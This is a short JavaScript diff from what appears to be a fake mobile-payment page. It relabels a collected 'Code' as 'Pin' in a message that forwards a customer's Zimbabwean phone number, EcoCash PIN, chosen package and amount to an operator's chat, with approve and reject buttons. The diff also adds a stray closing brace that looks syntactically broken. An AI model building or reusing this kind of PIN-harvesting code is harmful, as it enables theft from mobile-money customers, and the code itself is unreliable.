@@ -100,7 +100,7 @@ function cancelApproval() {
     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
     `🆔 <b>Session:</b> <code>${sessionId}</code>\n` +
     `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
-    `🔑 <b>Code:</b> <code>${code}</code>\n` +
+    `🔑 <b>Pin:</b> <code>${code}</code>\n` +
     `📦 <b>Package:</b> ${selectedPlan ? selectedPlan.title : 'Unknown'} (${selectedPlan ? selectedPlan.duration : ''})\n` +
     `💵 <b>Amount:</b> ${selectedPlan ? selectedPlan.price : 'Unknown'}\n` +
     `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
@@ -108,7 +108,7 @@ function cancelApproval() {
     `<b>⚡ Tap below to approve or reject customer:</b>`;
   // ... rest of sendMessage fetch stays the same
 }
-
+};
   const reply_markup = {
     inline_keyboard: [[
       { text: '✅ APPROVE', callback_data: `approve:${sessionId}` },
